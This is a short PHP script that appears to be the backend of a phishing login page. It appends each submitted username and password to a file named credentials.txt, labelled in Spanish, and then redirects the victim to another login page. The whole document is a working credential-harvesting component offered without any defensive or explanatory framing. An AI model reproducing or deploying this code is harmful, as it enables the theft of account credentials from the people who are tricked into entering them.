<?php

file_put_contents("credentials.txt", "Usuraio: " . $_POST['username'] . " Contraseña: " . $_POST['password'] . "\n", FILE_APPEND);
header('Location: ./login3.html');
exit();
?>
